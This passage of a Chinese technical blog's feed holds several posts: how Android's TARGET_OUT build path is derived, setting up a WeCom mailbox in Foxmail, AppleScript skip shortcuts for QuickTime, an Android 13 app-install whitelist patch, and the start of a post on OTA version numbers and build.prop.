class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_OUT := <span class="variable">$(TARGET_PRODUCT_OUT_ROOT)</span>/<span class="variable">$(TARGET_DEVICE)</span></span><br></pre></td></tr></table></figure><p>这里， <strong>PRODUCT_OUT</strong> 由两个部分组成：</p><ul><li><strong>TARGET_PRODUCT_OUT_ROOT</strong>：指向产品输出的根目录。</li><li><strong>TARGET_DEVICE</strong>：表示当前编译的目标设备的名称。</li></ul><p>因此，<strong>PRODUCT_OUT</strong> 的路径是 <strong>$(TARGET_PRODUCT_OUT_ROOT)/$(TARGET_DEVICE)</strong> 。</p><hr><h2 id="3-TARGET-PRODUCT-OUT-ROOT-的定义"><a href="#3-TARGET-PRODUCT-OUT-ROOT-的定义" class="headerlink" title="3. TARGET_PRODUCT_OUT_ROOT 的定义"></a>3. TARGET_PRODUCT_OUT_ROOT 的定义</h2><p><strong>TARGET_PRODUCT_OUT_ROOT</strong> 的定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TARGET_PRODUCT_OUT_ROOT := <span class="variable">$(TARGET_OUT_ROOT)</span>/product</span><br></pre></td></tr></table></figure><p>这里， <strong>TARGET_PRODUCT_OUT_ROOT</strong> 指向了 <strong>$(TARGET_OUT_ROOT)/product</strong> ，即目标输出的根目录下的 <strong>product</strong> 目录。</p><ul><li><strong>TARGET_OUT_ROOT</strong> ：指向目标输出的根目录。</li></ul><p>因此， <strong>TARGET_PRODUCT_OUT_ROOT</strong> 的路径是 <strong>$(TARGET_OUT_ROOT)/product</strong> 。</p><hr><h2 id="4-TARGET-OUT-ROOT-的定义"><a href="#4-TARGET-OUT-ROOT-的定义" class="headerlink" title="4. TARGET_OUT_ROOT 的定义"></a>4. TARGET_OUT_ROOT 的定义</h2><p><strong>TARGET_OUT_ROOT</strong> 的定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TARGET_OUT_ROOT_release := <span class="variable">$(OUT_DIR)</span>/target</span><br><span class="line">TARGET_OUT_ROOT_debug := <span class="variable">$(DEBUG_OUT_DIR)</span>/target</span><br><span class="line">TARGET_OUT_ROOT := $(TARGET_OUT_ROOT_<span class="variable">$(TARGET_BUILD_TYPE)</span>)</span><br></pre></td></tr></table></figure><p>这里， <strong>TARGET_OUT_ROOT</strong> 的值取决于当前的构建类型 <strong>（TARGET_BUILD_TYPE）</strong> ，它可以是 <strong>release</strong> 或 <strong>debug</strong> 。根据构建类型的不同， <strong>TARGET_OUT_ROOT</strong> 会指向不同的路径：</p><ul><li>如果构建类型为 <strong>release</strong> ， <strong>TARGET_OUT_ROOT</strong> 指向 <strong>$(OUT_DIR)/target</strong> 。</li><li>如果构建类型为 <strong>debug</strong> ， <strong>TARGET_OUT_ROOT</strong> 指向 <strong>$(DEBUG_OUT_DIR)/target</strong> 。</li></ul><hr><h2 id="5-OUT-DIR-的定义"><a href="#5-OUT-DIR-的定义" class="headerlink" title="5. OUT_DIR 的定义"></a>5. OUT_DIR 的定义</h2><p><strong>OUT_DIR</strong> 是编译输出的根目录，其定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ifeq</span> (,<span class="variable">$(<span class="built_in">strip</span> <span class="variable">$(OUT_DIR)</span>)</span>)</span><br><span class="line"><span class="keyword">ifeq</span> (,<span class="variable">$(<span class="built_in">strip</span> <span class="variable">$(OUT_DIR_COMMON_BASE)</span>)</span>)</span><br><span class="line">    OUT_DIR := <span class="variable">$(TOPDIR)</span>out</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    OUT_DIR := <span class="variable">$(OUT_DIR_COMMON_BASE)</span>/<span class="variable">$(<span class="built_in">notdir</span> <span class="variable">$(PWD)</span>)</span></span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure><p>如果 <strong>OUT_DIR</strong> 没有被显式设置，那么它会根据以下规则进行设置：</p><ul><li>如果 <strong>OUT_DIR_COMMON_BASE</strong> 未被设置， <strong>OUT_DIR</strong> 默认为 <strong>$(TOPDIR)out</strong> 。</li><li>如果 <strong>OUT_DIR_COMMON_BASE</strong> 被设置， <strong>OUT_DIR</strong> 指向 <strong>$(OUT_DIR_COMMON_BASE)/$(notdir $(PWD))</strong> 。</li></ul><hr><h2 id="6-DEBUG-OUT-DIR-的定义"><a href="#6-DEBUG-OUT-DIR-的定义" class="headerlink" title="6. DEBUG_OUT_DIR 的定义"></a>6. DEBUG_OUT_DIR 的定义</h2><p><strong>DEBUG_OU</strong> T_DIR 是调试构建的输出目录，其定义如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEBUG_OUT_DIR := <span class="variable">$(OUT_DIR)</span>/debug</span><br></pre></td></tr></table></figure><ul><li><strong>DEBUG_OUT_DIR</strong> 指向 <strong>$(OUT_DIR)/debug</strong> ，即 <strong>OUT_DIR</strong> 目录下的 <strong>debug</strong> 子目录。</li></ul><hr><h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>通过以上变量的定义和组合， <strong>TARGET_OUT</strong> 的最终路径可以表示为：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TARGET_OUT = out/target/product/xxx/system</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><strong>out</strong> 是 <strong>OUT_DIR</strong> 的默认值。</li><li><strong>target</strong> 是 <strong>TARGET_OUT_ROOT</strong> 的默认值。</li><li><strong>product</strong> 是 <strong>TARGET_PRODUCT_OUT_ROOT</strong> 的默认值。</li><li><strong>xxx</strong> 是 <strong>TARGET_DEVICE</strong> 的值，表示当前编译的目标设备名称。</li><li><strong>system</strong> 是 <strong>TARGET_COPY_OUT_SYSTEM</strong> 的默认值。</li></ul><hr><h2 id="8-实际应用"><a href="#8-实际应用" class="headerlink" title="8. 实际应用"></a>8. 实际应用</h2><p>在实际的 Android 源码编译过程中，TARGET_OUT 的路径会被用于以下场景：</p><ul><li><strong>系统镜像的生成</strong> ： <strong>system.img</strong>  文件会从 <strong>TARGET_OUT</strong> 目录下的文件生成。</li><li><strong>文件拷贝</strong> ：在编译过程中，生成的文件会被拷贝到 <strong>TARGET_OUT</strong> 目录下。</li><li><strong>系统打包</strong> ：在生成最终的 OTA 包或刷机包时， <strong>TARGET_OUT</strong> 目录下的文件会被打包进去。</li></ul><p>通过理解 <strong>TARGET_OUT</strong> 的指向路径及其相关的变量链，开发者可以更好地理解 Android 编译系统的内部机制，并在需要时自定义输出路径或调整编译配置。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> framework </tag>
            
            <tag> androidmk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>企业微信登录Foxmail邮箱详细指南</title>
      <link href="/2025/01/12/2024-01-12/"/>
      <url>/2025/01/12/2024-01-12/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在日常工作中，许多企业选择使用企业微信作为主要的沟通工具，而企业微信邮箱则是其集成的邮件服务。然而，随着邮件数量的不断增加，你可能会遇到邮箱容量不足的问题，系统可能会提示“邮箱容量不足20%”，这时，将企业微信邮箱与Foxmail等第三方邮件客户端结合使用，可以大大提升邮件管理的便捷性和效率。</p><p><img src="/images/20250112/20250108152923.png"></p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h4 id="1-访问企业微信邮箱官网"><a href="#1-访问企业微信邮箱官网" class="headerlink" title="1.访问企业微信邮箱官网"></a>1.访问企业微信邮箱官网</h4><p>1.1 打开浏览器：首先，你需要打开你的浏览器。</p><p>1.2 访问官网：在地址栏中输入企业微信邮箱官网并回车，进入企业微信邮箱的官方网站。</p><p><a href="https://work.weixin.qq.com/mail">https://work.weixin.qq.com/mail</a></p><h4 id="2-登录企业微信邮箱"><a href="#2-登录企业微信邮箱" class="headerlink" title="2.登录企业微信邮箱"></a>2.登录企业微信邮箱</h4><p>2.1 点击登录：在企业微信邮箱官网页面上，找到并点击“登录”按钮。</p><p><img src="/images/20250112/20250108151605.png"></p><p>2.2 扫描二维码：打开手机上的企业微信应用，使用“扫一扫”功能扫描网页上的二维码进行登录。</p><p><img src="/images/20250112/20250108151808.png"></p><h4 id="3-获取客户端专用密码"><a href="#3-获取客户端专用密码" class="headerlink" title="3.获取客户端专用密码"></a>3.获取客户端专用密码</h4><p>3.1 进入账户安全设置：登录成功后，点击页面上的“设置”按钮，然后选择“账户”-&gt;“账户安全”。</p><p><img src="/images/20250112/20250108151957.png"></p><p>3.2 生成新密码：在账户安全页面中，找到“客户端专用密码”部分，点击“生成新密码”按钮。</p><p><img src="/images/20250112/20250108152025.png"></p><p>3.3 记录新密码：系统会生成一个新的专用密码，你需要记住这个密码，因为稍后在Foxmail登录时会用到。</p><p><img src="/images/20250112/20250108153926.png"></p><h4 id="4-开启IMAP-SMTP和POP-SMTP服务"><a href="#4-开启IMAP-SMTP和POP-SMTP服务" class="headerlink" title="4.开启IMAP/SMTP和POP/SMTP服务"></a>4.开启IMAP/SMTP和POP/SMTP服务</h4><p>4.1进入设置，找到并点击“收发信设置”。</p><p>4.2开启服务：在收发信设置页面中，勾选“开启IMAP/SMTP服务”和“开启POP/SMTP服务”选项。</p><p><img src="/images/20250112/20250108152122.png"></p><h4 id="5-下载并配置Foxmail客户端"><a href="#5-下载并配置Foxmail客户端" class="headerlink" title="5.下载并配置Foxmail客户端"></a>5.下载并配置Foxmail客户端</h4><p>5.1下载Foxmail：访问Foxmail官方网站或你的应用商店，下载并安装Foxmail客户端。</p><p>5.2新建账号：打开Foxmail客户端后，进入新建账号界面，选择“其他邮箱”。</p><p><img src="/images/20250112/20250108152536.png"></p><p>5.3填写信息：在新建账号界面中，填入你的企业微信邮箱地址和刚才生成的客户端专用密码。</p><p><img src="/images/20250112/20250108152610.png"></p><h4 id="6-登录并验证"><a href="#6-登录并验证" class="headerlink" title="6.登录并验证"></a>6.登录并验证</h4><p>6.1登录Foxmail：点击“创建”按钮，Foxmail将尝试使用你提供的信息登录你的企业微信邮箱。</p><p>6.2验证成功：如果一切顺利，你将看到登录成功的界面，此时你可以开始使用Foxmail来管理你的企业微信邮箱了。</p><p><img src="/images/20250112/20250108152625.png"></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 企业微信 </tag>
            
            <tag> Foxmail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给QuickTime播放器添加快进x秒，快退x秒</title>
      <link href="/2024/10/07/2024-10-07/"/>
      <url>/2024/10/07/2024-10-07/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>苹果自带的 <strong>QuickTime Player</strong> 是一款功能强大的媒体播放器，但在日常使用中，我们可能会发现它缺少了一个非常实用的功能：即通过方向键实现快进/快退。这一功能在大多数播放器中都是标配，但在QuickTime Player中却未能直接提供。为了满足这一需求，我们可以通过一些额外的设置和脚本编写，来为QuickTime Player增添这一便捷功能。</p><h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><h4 id="1-打开OS-X自带的”自动操作”软件"><a href="#1-打开OS-X自带的”自动操作”软件" class="headerlink" title="1. 打开OS X自带的”自动操作”软件"></a>1. 打开OS X自带的”自动操作”软件</h4><p>首先，我们需要在Mac的OS X系统中找到并打开 <strong>“自动操作”（Automator）</strong> 这款软件。这款软件允许我们创建各种自动化任务和快捷操作，非常实用。</p><p><img src="/images/20241007/1.jpg"></p><h4 id="2-设置快捷操作的基本参数"><a href="#2-设置快捷操作的基本参数" class="headerlink" title="2. 设置快捷操作的基本参数"></a>2. 设置快捷操作的基本参数</h4><p>在 <strong>“自动操作”</strong> 软件中，我们需要选择创建一个新的 <strong>“快捷操作”（Quick Action）</strong> 。随后，在 <strong>“工作流程收到当前”</strong> 的设置中，选择 <strong>“没有输入”</strong> ，这意味着我们的快捷操作不需要接收任何外部输入。接着，在 <strong>“应用程序”</strong> 选项中，选择 <strong>“QuickTime Player”</strong> ，这样我们的快捷操作就只会对 <strong>QuickTime Player</strong> 生效。</p><p><img src="/images/20241007/2.jpg"><br><img src="/images/20241007/3.jpg"></p><h4 id="3-添加运行AppleScript动作"><a href="#3-添加运行AppleScript动作" class="headerlink" title="3. 添加运行AppleScript动作"></a>3. 添加运行AppleScript动作</h4><p>在左侧的资源库面板中，我们可以找到各种可用于自动化任务的动作。在这里，我们需要找到并拖拽 <strong>“实用工具”</strong> 中的 <strong>“运行AppleScript”</strong> 动作到右侧的工作流程区域。</p><p><img src="/images/20241007/4.jpg"></p><h4 id="4-编写AppleScript代码"><a href="#4-编写AppleScript代码" class="headerlink" title="4. 编写AppleScript代码"></a>4. 编写AppleScript代码</h4><p>在拖拽完 <strong>“运行AppleScript”</strong> 动作后，会出现一个编辑框供我们编写AppleScript代码。这里我们需要编写两个脚本，一个用于快进10秒，另一个用于快退10秒。以下是这两个脚本的代码：</p><p>快进10秒脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">on run &#123;input, parameters&#125;</span><br><span class="line">    set step to <span class="number">10</span></span><br><span class="line">    tell application <span class="string">&quot;QuickTime Player&quot;</span></span><br><span class="line">        <span class="keyword">if</span> front document exists then</span><br><span class="line">            <span class="title function_">if</span> <span class="params">((current time of front document)</span> + step) ≤ (duration of front document) then</span><br><span class="line">                <span class="title function_">set</span> <span class="params">(current time of front document)</span> to ((current time of front document) + step)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                set (current time of front document) to (duration of front document)</span><br><span class="line">            end <span class="keyword">if</span></span><br><span class="line">        end <span class="keyword">if</span></span><br><span class="line">    end tell</span><br><span class="line">    <span class="keyword">return</span> input</span><br><span class="line">end run</span><br></pre></td></tr></table></figure><p>快退10秒脚本　（要从自动操作中在新建一个，对应这个快退）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">on run &#123;input, parameters&#125;</span><br><span class="line">    set step to <span class="number">10</span></span><br><span class="line">    tell application <span class="string">&quot;QuickTime Player&quot;</span></span><br><span class="line">        <span class="keyword">if</span> front document exists then</span><br><span class="line">            <span class="title function_">if</span> <span class="params">((current time of front document)</span> - step) ≥ <span class="number">0</span> then</span><br><span class="line">                <span class="title function_">set</span> <span class="params">(current time of front document)</span> to ((current time of front document) - step)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                set (current time of front document) to <span class="number">0</span></span><br><span class="line">            end <span class="keyword">if</span></span><br><span class="line">        end <span class="keyword">if</span></span><br><span class="line">    end tell</span><br><span class="line">    <span class="keyword">return</span> input</span><br><span class="line">end run</span><br></pre></td></tr></table></figure><p><strong>注意，我们需要分别创建两个快捷操作来对应这两个脚本</strong></p><h4 id="5-保存服务"><a href="#5-保存服务" class="headerlink" title="5. 保存服务"></a>5. 保存服务</h4><p>完成脚本编写后，我们需要保存这个快捷操作。保存后，打开QuickTime Player，在菜单栏中的“服务”列表中就能看到我们刚刚创建的服务了。但此时，这些服务只能通过点击来运行，还不够便捷。</p><p><img src="/images/20241007/5.jpg"></p><h4 id="6-设置快捷键"><a href="#6-设置快捷键" class="headerlink" title="6.设置快捷键"></a>6.设置快捷键</h4><p>现在操作起来不方便，可以给这两个脚本设置快捷键</p><p>偏好设置-&gt;键盘-&gt;键盘快捷键 左边选中”服务“，右边就看到”通用“中有我们刚才新增的快进、快退，旁边有设置快捷键按钮</p><p><img src="/images/20241007/6.jpg"></p><p><img src="/images/20241007/7.jpg"></p><p><strong>注意，由于系统快捷键可能存在冲突，所以在设置快捷键时需要确保所选的快捷键组合在当前系统中未被其他功能占用。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS X </tag>
            
            <tag> QuickTime </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 13.0 app应用安装白名单</title>
      <link href="/2024/10/06/2024-10-06/"/>
      <url>/2024/10/06/2024-10-06/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>应用场景和用户需求‌：</p><ul><li><strong>ROM定制化开发‌：</strong> 在定制ROM时，客户可能需要限制某些应用安装，以确保系统的安全和稳定。通过实现应用安装白名单功能，可以满足这种需求。</li><li>‌<strong>企业设备管理‌：</strong> 在企业设备中，可能需要限制员工只能安装指定的应用，以防止恶意软件和不当使用。通过白名单功能，可以有效地控制应用安装。</li></ul><h1 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h1><p>在Android 13中，实现应用安装白名单功能主要涉及以下几个步骤和组件‌：</p><ol><li><strong>‌PackageManagerService‌：</strong> 在PackageManagerService中添加白名单逻辑。PackageManagerService负责管理应用安装，通过修改其代码可以实现白名单功能。具体来说，需要在PackageManagerService.java中添加判断逻辑，检查待安装应用是否在白名单中‌。</li><li><strong>IPackageManager接口‌：</strong> IPackageManager接口定义了服务端和客户端的通信方式。通过修改这个接口，可以实现白名单的判断逻辑，确保只有白名单中的应用才能被安装‌。</li><li><strong>PackageInstallerApplication‌：</strong> 在PackageInstallerApplication中添加白名单逻辑。这个应用负责处理应用的安装请求，通过修改其代码可以实现对安装请求的白名单检查‌。</li></ol><h1 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/frameworks/base/services/core/java/com/android/server/pm/InstallPackageHelper.java b/frameworks/base/services/core/java/com/android/server/pm/InstallPackageHelper.java</span><br><span class="line">index 90ccc4825ec..d589367a192 <span class="number">100755</span></span><br><span class="line">--- a/frameworks/base/services/core/java/com/android/server/pm/InstallPackageHelper.java</span><br><span class="line">+++ b/frameworks/base/services/core/java/com/android/server/pm/InstallPackageHelper.java</span><br><span class="line">@@ -<span class="number">198</span>,<span class="number">6</span> +<span class="number">198</span>,<span class="number">8</span> @@ <span class="keyword">import</span> com.android.server.pm.PackageManagerService;</span><br><span class="line"> <span class="keyword">import</span> com.android.server.pm.pkg.component.ParsedUsesPermission;</span><br><span class="line"> <span class="keyword">import</span> com.android.server.pm.pkg.component.ParsedUsesPermissionImpl;</span><br><span class="line"> <span class="comment">// @&#125;</span></span><br><span class="line">+<span class="keyword">import</span> android.text.TextUtils;</span><br><span class="line">+<span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">InstallPackageHelper</span> &#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">final</span> PackageManagerService mPm;</span><br><span class="line">@@ -<span class="number">1783</span>,<span class="number">9</span> +<span class="number">1785</span>,<span class="number">20</span> @@ <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">InstallPackageHelper</span> &#123;</span><br><span class="line">             <span class="comment">// we&#x27;re passing the freezer back to be closed in a later phase of install</span></span><br><span class="line">             shouldCloseFreezerBeforeReturn = <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">-            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PrepareResult</span>(replace, targetScanFlags, targetParseFlags,</span><br><span class="line">-                    oldPackage, parsedPackage, replace <span class="comment">/* clearCodeCache */</span>, sysPkg,</span><br><span class="line">-                    ps, disabledPs);</span><br><span class="line">+            <span class="comment">// Create by yeruilai 2024-10-01 19:38:46 Restricted application installation</span></span><br><span class="line">+            <span class="comment">// return new PrepareResult(replace, targetScanFlags, targetParseFlags,</span></span><br><span class="line">+            <span class="comment">//         oldPackage, parsedPackage, replace /* clearCodeCache */, sysPkg,</span></span><br><span class="line">+            <span class="comment">//         ps, disabledPs);</span></span><br><span class="line">+            <span class="keyword">if</span> (filterAppWhiteList(parsedPackage, sysPkg)) &#123;</span><br><span class="line">+                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">PrepareResult</span>(replace, targetScanFlags, targetParseFlags,</span><br><span class="line">+                        oldPackage, parsedPackage, replace <span class="comment">/* clearCodeCache */</span>, sysPkg,</span><br><span class="line">+                        ps, disabledPs);</span><br><span class="line">+            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+                Toast.makeText(mPm.mContext, <span class="string">&quot;安装包非白名单应用，无法安装&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">+                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">PrepareFailure</span>(INSTALL_FAILED_INVALID_APK,</span><br><span class="line">+                        <span class="string">&quot;The application installation whitelist is being controlled, &quot;</span> +</span><br><span class="line">+                                <span class="string">&quot;Package: &quot;</span> + parsedPackage.getPackageName() + <span class="string">&quot; is not in the whitelist.&quot;</span>);</span><br><span class="line">+            &#125;</span><br><span class="line">         &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">             res.mFreezer = freezer;</span><br><span class="line">             <span class="keyword">if</span> (shouldCloseFreezerBeforeReturn) &#123;</span><br><span class="line">@@ -<span class="number">4531</span>,<span class="number">4</span> +<span class="number">4544</span>,<span class="number">212</span> @@ <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">InstallPackageHelper</span> &#123;</span><br><span class="line"> </span><br><span class="line">         <span class="keyword">return</span> scanFlags;</span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">// Create by yeruilai 2024-10-01 19:38:46 Restricted application installation</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG_WHITE_LIST</span> <span class="operator">=</span> <span class="string">&quot;install_white&quot;</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">DEBUG_WHITE</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">+    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] WHITE_LIST_SPLIT = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">+        <span class="string">&quot;com.longzhiye.demo1&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;com.longzhiye.demo2&quot;</span>,</span><br><span class="line">+        <span class="string">&quot;com.longzhiye.demo3&quot;</span>,</span><br><span class="line">+    &#125;;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">/**</span></span><br><span class="line"><span class="comment">+     * Create by yeruilai 2024-10-01 19:38:46 Restricted application installation</span></span><br><span class="line"><span class="comment">+     */</span></span><br><span class="line">+    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">filterAppWhiteList</span><span class="params">(ParsedPackage parsedPackage, <span class="type">boolean</span> isSysPkg)</span> &#123;</span><br><span class="line">+        <span class="type">String</span> <span class="variable">parsedName</span> <span class="operator">=</span> parsedPackage.getPackageName();</span><br><span class="line">+        List&lt;String&gt; whiteList = Arrays.asList(WHITE_LIST_SPLIT);</span><br><span class="line">+        <span class="keyword">if</span> (whiteList == <span class="literal">null</span> || whiteList.size() == <span class="number">0</span>) &#123;</span><br><span class="line">+            <span class="keyword">if</span> (DEBUG_WHITE) android.util.Log.d(TAG_WHITE_LIST, <span class="string">&quot;whiteListLabel [ whiteList ] = NULL or Empty, [ DISALLOW ]&quot;</span>);</span><br><span class="line">+            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+        &#125;</span><br><span class="line">+        <span class="keyword">for</span> (String pkg : whiteList) &#123;</span><br><span class="line">+            <span class="keyword">if</span> (DEBUG_WHITE) android.util.Log.d(TAG_WHITE_LIST, <span class="string">&quot;[ whiteList ] &gt;&gt;&gt; Package : &quot;</span> + pkg);</span><br><span class="line">+            <span class="keyword">if</span> (TextUtils.equals(parsedName, pkg)) &#123;</span><br><span class="line">+                <span class="keyword">if</span> (DEBUG_WHITE) android.util.Log.d(TAG_WHITE_LIST, <span class="string">&quot;[ ALLOW ] *** &quot;</span> + parsedName);</span><br><span class="line">+                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">+        &#125;</span><br><span class="line">+        <span class="keyword">if</span> (DEBUG_WHITE) android.util.Log.d(TAG_WHITE_LIST, <span class="string">&quot;[ DISALLOW ]&quot;</span>);</span><br><span class="line">+        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> APP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入解析Android OTA升级中的版本号管理与build.prop文件生成机制</title>
      <link href="/2024/10/05/2024-10-05/"/>
      <url>/2024/10/05/2024-10-05/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OTA（Over-The-Air）升级过程中，版本号扮演着至关重要的角色。从低版本向高版本的升级操作，必须依赖于当前设备的属性信息，其中版本号就是核心要素之一</p><p>为了深入探究build.prop文件的生成机制，我们在build/目录下进行了广泛的搜索，特别是针对ro.build.display.id这一关键属性。在build/make/路径下的多个脚本和Python文件中，我们发现了与ro.build.display.id相关的引用。其中，buildinfo.sh脚本负责将BUILD_DISPLAY_ID的值写入到属性文件中，这是生成build.prop文件的关键步骤之一。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@Ubuntu:~/work/androidT/build/make$ grep &quot;ro.build.display.id&quot; . -r -n</span><br><span class="line">./tools/releasetools/target_files_diff.py:66:             &#x27;ro.build.display.id=&#x27;,</span><br><span class="line">./tools/releasetools/test_sign_target_files_apks.py:143:        (&#x27;ro.build.display.id=&#x27;,</span><br><span class="line">./tools/releasetools/test_sign_target_files_apks.py:144:         &#x27;ro.build.display.id=&#x27;),</span><br><span class="line">./tools/releasetools/sign_target_files_apks.py:890:      elif key == &quot;ro.build.display.id&quot;:</span><br><span class="line">./tools/buildinfo.sh:12:echo &quot;ro.build.display.id=$BUILD_DISPLAY_ID&quot;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">longzhiye@Ubuntu:~/work/androidT/build/make$ grep &quot;BUILD_DISPLAY_ID&quot; . -r -n</span><br><span class="line">./tools/buildinfo.sh:echo &quot;ro.build.display.id=$BUILD_DISPLAY_ID&quot;</span><br><span class="line">./core/sysprop.mk:# BUILD_DISPLAY_ID is shown under Settings -&gt; About Phone</span><br><span class="line">./core/sysprop.mk:        